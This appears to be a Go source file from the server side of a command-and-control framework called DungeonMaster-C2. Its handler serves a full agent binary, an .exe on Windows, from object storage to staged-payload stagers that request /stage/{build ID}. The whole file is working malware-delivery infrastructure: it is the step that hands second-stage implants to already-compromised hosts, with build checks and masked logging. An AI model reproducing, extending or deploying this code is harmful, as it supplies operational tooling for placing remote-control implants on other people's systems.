package api

import (
	"context"
	"io"
	"net/http"
	"strconv"
	"strings"
	"time"

	"github.com/BroJustLeaveMeAlone/DungeonMaster-C2/server/internal/db"
	"github.com/BroJustLeaveMeAlone/DungeonMaster-C2/server/internal/storage"
	"github.com/minio/minio-go/v7"
	"go.uber.org/zap"
)

// handleStage serves the companion full-agent PE to a staged-payload stager.
// The stager bakes DM_BUILD_UUID = builds.id and fetches /stage/{id} at runtime.
// The companion payload binary (no staged-payload feature) is uploaded alongside
// the stager artifact as {buildID}-payload{ext} during the build job.
func (s *C2Server) handleStage(w http.ResponseWriter, r *http.Request) {
	buildID := strings.TrimPrefix(r.URL.Path, "/stage/")
	buildID = strings.TrimSpace(buildID)

	if len(buildID) != 36 ||
		buildID[8] != '-' || buildID[13] != '-' ||
		buildID[18] != '-' || buildID[23] != '-' {
		http.Error(w, "not found", http.StatusNotFound)
		return
	}

	ctx, cancel := context.WithTimeout(r.Context(), 30*time.Second)
	defer cancel()

	var status, targetOS string
	err := db.Pool.QueryRow(ctx,
		`SELECT status, target_os FROM builds WHERE id = $1`,
		buildID,
	).Scan(&status, &targetOS)
	if err != nil {
		s.log.Warn("stage: build lookup failed", zap.String("id", maskUUID(buildID)), zap.Error(err))
		http.Error(w, "not found", http.StatusNotFound)
		return
	}
	if status != "complete" {
		s.log.Warn("stage: build not complete", zap.String("id", maskUUID(buildID)), zap.String("status", status))
		http.Error(w, "not found", http.StatusNotFound)
		return
	}

	ext := ""
	if targetOS == "windows" {
		ext = ".exe"
	}
	objectKey := buildID + "-payload" + ext

	obj, err := storage.Client.GetObject(ctx, storage.BucketArtifacts, objectKey, minio.GetObjectOptions{})
	if err != nil {
		s.log.Warn("stage: GetObject failed", zap.String("id", maskUUID(buildID)), zap.String("key", objectKey), zap.Error(err))
		http.Error(w, "not found", http.StatusNotFound)
		return
	}
	defer obj.Close()

	stat, err := obj.Stat()
	if err != nil {
		s.log.Warn("stage: Stat failed", zap.String("id", maskUUID(buildID)), zap.String("key", objectKey), zap.Error(err))
		http.Error(w, "not found", http.StatusNotFound)
		return
	}

	w.Header().Set("Content-Type", "application/octet-stream")
	w.Header().Set("Content-Length", strconv.FormatInt(stat.Size, 10))
	w.WriteHeader(http.StatusOK)
	io.Copy(w, obj) //nolint:errcheck
}

// maskUUID replaces the last 12 chars of a UUID with asterisks for logging.
func maskUUID(u string) string {
	if len(u) < 12 {
		return "***"
	}
	return u[:len(u)-12] + "***"
}
